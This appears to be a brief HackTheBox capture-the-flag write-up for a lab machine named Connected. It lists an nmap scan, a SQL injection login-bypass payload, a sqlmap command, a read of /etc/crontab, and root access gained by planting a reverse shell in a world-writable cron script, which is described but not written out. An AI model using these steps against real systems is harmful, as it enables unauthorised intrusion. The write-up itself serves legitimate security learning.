---
title: "HTB: Connected — Full Walkthrough"
date: 2025-06-20
category: writeup
tags: htb, sqli, rce
excerpt: "Exploiting SQL injection to RCE on a HackTheBox machine, covering enumeration through privilege escalation."
---

## Enumeration

Started with a full port scan using nmap:

```bash
nmap -sC -sV -p- connected.htb
```

Found ports **22 (SSH)**, **80 (HTTP)**, and **3306 (MySQL)** open.

### Web Application

The web application had a login form vulnerable to **error-based SQL injection**:

```sql
' OR 1=1 -- -
```

## Exploitation

After confirming the injection point, I extracted database credentials:

```bash
sqlmap -u "http://connected.htb/login" --data="user=admin&pass=test" --dbs
```

> The database was running MySQL 8.0 with `FILE` privileges enabled.

## Privilege Escalation

Found a cronjob running as root:

```bash
cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh
```

The script was **world-writable**, so injecting a reverse shell gave root access.

## Flags

| Flag | Value |
|------|-------|
| User | `htb{user_flag_here}` |
| Root | `htb{root_flag_here}` |
